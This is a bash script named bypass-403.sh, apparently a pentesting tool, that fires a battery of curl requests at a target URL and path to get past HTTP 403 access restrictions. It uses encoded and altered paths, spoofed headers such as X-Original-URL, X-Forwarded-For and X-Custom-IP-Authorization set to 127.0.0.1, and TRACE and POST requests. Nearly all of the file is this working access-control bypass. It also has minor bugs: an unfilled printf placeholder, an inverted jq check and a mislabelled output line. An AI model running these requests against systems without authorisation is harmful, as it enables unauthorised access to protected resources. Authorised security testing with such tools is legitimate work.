#!/bin/bash
# Created by iamj0ker, forked by fhAnso ...
command -v figlet &>/dev/null && figlet Bypass-403 || {
echo
echo "██████╗ ██╗   ██╗██████╗  █████╗ ███████╗███████╗      ██╗  ██╗ ██████╗ ██████╗" 
echo "██╔══██╗╚██╗ ██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝      ██║  ██║██╔═████╗╚════██╗"
echo "██████╔╝ ╚████╔╝ ██████╔╝███████║███████╗███████╗█████╗███████║██║██╔██║ █████╔╝"
echo "██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║╚════╝╚════██║████╔╝██║ ╚═══██╗"
echo "██████╔╝   ██║   ██║     ██║  ██║███████║███████║           ██║╚██████╔╝██████╔╝"
echo "╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝           ╚═╝ ╚═════╝ ╚═════╝ "
}
[[ $# -eq 0 ]] && {
  echo "ERROR: No params specified. EXIT!"
  exit -1
}

function print_err()
{
  local flag="$1"
  printf "ERROR: %s flag set but not argument given!"
  exit -1
}

banner="
Usage: bypass-403.sh [options]

-h, --help    Display this help banner
-u, --url     Target URL
-p, --path    Target path
-c, --cookie  Session cookie

Example: ./bypass-403.sh -u http://targetsite.xyz -p secret
"

while [[ $# -gt 0 ]]
do
  case "$1" in
    -h|--help)
      echo -e "$banner" 
      exit 0 
      ;;
    -u|--url)
      [[ -n "$2" ]] && {
        url="$2"
        shift
      } || print_err "URL"
      ;;
    -p|--path)
      [[ -n "$2" ]] && {
        path="$2"
        shift
      } || print_err "Path"
      ;;
    -c|--cookie)
      [[ -n "$2" ]] && {
        cookie="$2"
        shift
      } || print_err "Cookie"
      ;;
    *)
      echo "Invalid argument!"
      ;;
    esac
    shift
done
# -k  Allow insecure sever connections
# -s  Silend mode
# -o  output: Write to file instead of stdout
# -iL Include protocol response headers in output - follow redirects
# -w  Use output FORMAT after completion
# -b  Send cookie from string

printf "\n[*] Testing accessibility of %s at %s..\n\n" "$path" "$url"

curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path
echo "  --> ${url}/${path}"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/%2e/$path
echo "  --> ${url}/%2e/${path}"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/.
echo "  --> ${url}/${path}/."
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url//$path//
echo "  --> ${url}//${path}//"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/./$path/./
echo "  --> ${url}/./${path}/./"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Original-URL: $path" $url/$path
echo "  --> ${url}/${path} -H X-Original-URL: ${path}"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Custom-IP-Authorization: 127.0.0.1" $url/$path
echo "  --> ${url}/${path} -H X-Custom-IP-Authorization: 127.0.0.1"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: http://127.0.0.1" $url/$path
echo "  --> ${url}/${path} -H X-Forwarded-For: http://127.0.0.1"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-For: 127.0.0.1:80" $url/$path
echo "  --> ${url}/${path} -H X-Forwarded-For: 127.0.0.1:80"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-rewrite-url: $path" $url
echo "  --> ${url} -H X-rewrite-url: ${path}"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%20
echo "  --> ${url}/${path}%20"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%0A
echo "  --> ${url}/${path}%0A"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path%09
echo "  --> ${path}/${url}%09"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path?
echo "  --> ${url}/${path}?"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.html
echo "  --> ${url}/${path}.html"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/?anything
echo "  --> ${url}/${path}/?anything"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path#
echo "  --> ${url}/${path}#"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "Content-Length:0" -X POST $url/$path
echo "  --> ${url}/${path} -H Content-Length:0 -X POST"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path/*
echo "  --> ${url}/${path}/*"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.php
echo "  --> ${url}/${path}.php"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" $url/$path.json
echo "  --> ${url}/${path}.json"
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
echo "  --> ${url}/${path}  -X TRACE"
curl -s -b "$cookie" -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Host: 127.0.0.1" $url/$path
echo "  --> ${url}/${path} -H X-Host: 127.0.0.1"
curl -s -b "$cookie" -o /dev/null -iL -w "%{http_code}","%{size_download}" "$url/$path..;/"
echo "  --> ${url}/${path}..;/"
curl -s -b "$cookie" -o /dev/null -iL -w "%{http_code}","%{size_download}" " $url/$path;/"
echo "  --> ${url}/${path};/"
#updated
curl -k -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -X TRACE $url/$path
echo "  --> ${url}/${path} -X TRACE"
curl -b "$cookie" -s -o /dev/null -iL -w "%{http_code}","%{size_download}" -H "X-Forwarded-Host: 127.0.0.1" $url/$path
echo "  --> ${url}/${path} -H X-Forwarded-Host: 127.0.0.1"
command -v jq &>/dev/null || {
echo "Way back machine:"
curl -s  https://archive.org/wayback/available?url=$url/$path | jq -r '.archived_snapshots.closest | {available, url}'
}

printf "\n[*] Done\n"
